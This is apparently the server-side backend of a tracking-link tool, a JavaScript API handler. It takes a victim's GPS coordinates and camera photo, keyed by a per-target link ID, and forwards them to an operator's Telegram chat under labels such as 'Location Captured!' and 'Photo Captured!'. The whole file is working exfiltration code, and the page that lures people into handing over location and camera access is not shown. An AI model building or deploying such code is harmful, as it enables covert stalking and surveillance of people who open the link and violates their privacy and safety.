export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const ADMIN_ID = process.env.ADMIN_ID;

  const { linkId, type, photoData, coords } = req.body;

  if (!linkId) {
    return res.status(400).json({ error: 'Missing linkId' });
  }

  try {
    // Always send to admin for now (with linkId so admin can forward)
    let targetChatId = ADMIN_ID;

    // ---- LOCATION ----
    if (type === 'location' && coords) {
      const message = 
`📍 **Location Captured!**

Latitude: \`${coords.lat}\`
Longitude: \`${coords.lng}\`
🌐 [View on Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})
⏰ Time: ${new Date().toISOString()}
🔗 Link ID: \`${linkId}\``;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: targetChatId, 
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    // ---- PHOTO (NO IMGUR - send base64 directly) ----
    if (type === 'photo' && photoData) {
      // Convert base64 to buffer
      const base64Data = photoData.replace(/^data:image\/\w+;base64,/, '');
      const buffer = Buffer.from(base64Data, 'base64');

      // Send photo directly to Telegram using multipart/form-data
      const formData = new FormData();
      
      // Create a Blob from the buffer
      const blob = new Blob([buffer], { type: 'image/jpeg' });
      
      // Create a File from the Blob
      const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
      
      formData.append('chat_id', targetChatId);
      formData.append('photo', file, 'photo.jpg');
      formData.append('caption', `📸 Photo Captured!\n⏰ ${new Date().toISOString()}\n🔗 Link ID: \`${linkId}\``);
      formData.append('parse_mode', 'Markdown');

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}
